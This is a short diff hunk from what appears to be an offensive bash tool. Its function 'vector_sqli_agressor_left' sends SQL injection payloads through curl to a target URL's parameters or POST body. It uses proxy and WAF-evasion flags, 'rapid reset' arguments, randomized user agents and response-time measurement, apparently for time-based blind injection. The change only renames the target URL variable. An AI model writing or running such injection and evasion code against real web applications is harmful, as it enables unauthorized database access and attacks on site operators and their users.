@@ -97,13 +97,13 @@ vector_sqli_agressor_left() {
           --tlsv1.3 --ciphers "$target_cipher" --tls13-ciphers "$target_tls13" \
           -m 12 -A "$random_ua" -s -o /dev/null -d "$post_data" \
           -w "%{time_total}|%{http_code}" \
-          "$target_url")
+          "$clean_target_url")
       else
         curl_output=$(command curl $proxy_flag $cookie_flag $waf_args $rapid_reset_args \
           --tlsv1.3 --ciphers "$target_cipher" --tls13-ciphers "$target_tls13" \
           -m 12 -A "$random_ua" -s -o /dev/null \
           -w "%{time_total}|%{http_code}" \
-          "${target_url}${join_char}${current_param}=${active_payload}")
+          "${clean_target_url}${join_char}${current_param}=${active_payload}")
       fi
 
       local stopwatch
